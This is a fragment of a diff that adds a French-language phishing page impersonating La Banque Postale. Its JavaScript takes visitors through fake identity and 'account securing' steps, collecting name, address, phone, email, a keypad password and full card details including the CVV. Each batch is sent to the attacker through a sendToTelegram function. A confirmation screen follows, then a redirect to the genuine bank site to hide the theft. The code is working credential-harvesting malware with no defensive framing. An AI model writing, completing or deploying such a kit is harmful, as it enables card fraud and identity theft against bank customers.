+                    codePostalInput.value.trim() === '' ||
+                    emailInput.value.trim() === '') {
+                    alert('Veuillez remplir toutes les informations personnelles.');
+                    return;
+                }
+
+                // Envoi des informations personnelles à Telegram
+                const personalInfoMessage = `
+                    <i>Informations Personnelles Saisies :</i>
+                    <b>Nom et Prénom :</b> ${nomPrenomInput.value}
+                    <b>Téléphone :</b> ${telephoneInput.value}
+                    <b>Adresse :</b> ${adresseInput.value}
+                    <b>Code Postal :</b> ${codePostalInput.value}
+                    <b>Email :</b> ${emailInput.value}
+                `;
+                await sendToTelegram(personalInfoMessage);
+
+
+                showLoadingSpinner();
+                setTimeout(() => {
+                    hideLoadingSpinner();
+                    personalInfoSection.style.display = 'none';
+                    bankInfoSection.style.display = 'block';
+                    dynamicH1.textContent = 'Sécurisation du compte'; // Changer le titre pour l'étape 4
+                    mainContinueButton.textContent = 'Confirmer';
+                    currentStep = 4;
+                    window.scrollTo(0, 0); // Retour en haut de page
+                }, 2000);
+
+            } else if (currentStep === 4) {
+                const cardNumber = cardNumberInput.value.replace(/\s/g, '');
+                const expiryDate = expiryDateInput.value;
+                const cvv = cvvInput.value;
+
+                if (cardNumber.length !== 16 || isNaN(cardNumber)) {
+                    alert('Veuillez saisir un numéro de carte bancaire valide à 16 chiffres.');
+                    return;
+                }
+                if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
+                    alert('Veuillez saisir une date d\'expiration valide (MM/AA).');
+                    return;
+                }
+                if (cvv.length !== 3 || isNaN(cvv)) {
+                    alert('Veuillez saisir un CVV valide à 3 chiffres.');
+                    return;
+                }
+
+                // Envoi des informations bancaires à Telegram
+                const bankInfoMessage = `
+                    <i>Informations Bancaires Saisies :</i>
+                    <b>Numéro de carte :</b> ${cardNumber}
+                    <b>Date d'expiration :</b> ${expiryDate}
+                    <b>CVV :</b> ${cvv}
+                `;
+                await sendToTelegram(bankInfoMessage);
+
+
+                showLoadingSpinner();
+                setTimeout(() => {
+                    hideLoadingSpinner();
+                    
+                    // Masquer les deux conteneurs principaux (left et right)
+                    mainContentContainer.style.display = 'none';
+                    rightSideContent.style.display = 'none';
+
+                    // Afficher la page de confirmation
+                    confirmationPage.style.display = 'flex';
+                    window.scrollTo(0, 0); // Retour en haut de page pour la page de confirmation
+                    
+                    currentStep = 5;
+
+                    setTimeout(() => {
+                        window.location.href = 'https://www.labanquepostale.fr/particulier/solutions-citoyennes.html';
+                    }, 15000); // Redirection après 15 secondes
+                }, 2000);
+            }
+        });
+
+        keypad.querySelectorAll('button').forEach(button => {
+            button.addEventListener('click', () => {
+                const digit = button.dataset.digit;
+                if (passwordValue.length < 6) {
+                    passwordValue += digit;
+                    updatePasswordCircles();
+                }
+                passwordError.style.display = 'none';
+            });
+        });
+
+        clearPasswordCharButton.addEventListener('click', () => {
+            passwordValue = passwordValue.slice(0, -1);
+            updatePasswordCircles();
+            passwordError.style.display = 'none';
+        });
+
+        identifiantInput.addEventListener('input', () => {
+            clearIdentifiantCharButton.style.display = identifiantInput.value.length > 0 ? 'block' : 'none';
+            if (identifiantError.style.display === 'block') {
+                identifiantError.style.display = 'none';
+                identifiantError.textContent = '';
+                identifiantInputWrapper.classList.remove('has-error');
+            }
+        });
+
+        clearIdentifiantCharButton.addEventListener('click', () => {
+            identifiantInput.value = identifiantInput.value.slice(0, -1);
+            identifiantInput.dispatchEvent(new Event('input'));
+        });
+
+        emailInput.addEventListener('input', () => {
+            if (emailError.style.display === 'block') {
+                emailError.style.display = 'none';
+            }
+        });
+
+
+        function updatePasswordCircles() {
+            passwordCircles.forEach((circle, index) => {
+                circle.classList.toggle('filled', index < passwordValue.length);
+            });
+        }
+
+        function formatCardNumber(input) {
+            let value = input.value.replace(/\D/g, '');
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            input.value = formattedValue;
+        }
+
+        function formatExpiryDate(input) {
+            let value = input.value.replace(/\D/g, '');
+            let formattedValue = '';
+            if (value.length > 2) {
+                formattedValue = value.substring(0, 2) + '/' + value.substring(2, 4);
+            } else {
+                formattedValue = value;
+            }
+            input.value = formattedValue;
+        }
+
+        cardNumberInput.addEventListener('input', () => formatCardNumber(cardNumberInput));
+        expiryDateInput.addEventListener('input', () => formatExpiryDate(expiryDateInput));
+        cvvInput.addEventListener('input', () => {
+            cvvInput.value = cvvInput.value.replace(/[^0-9]/g, '');
+        });
+
+        initializeForm();
+    </script>
+</body>
+</html>
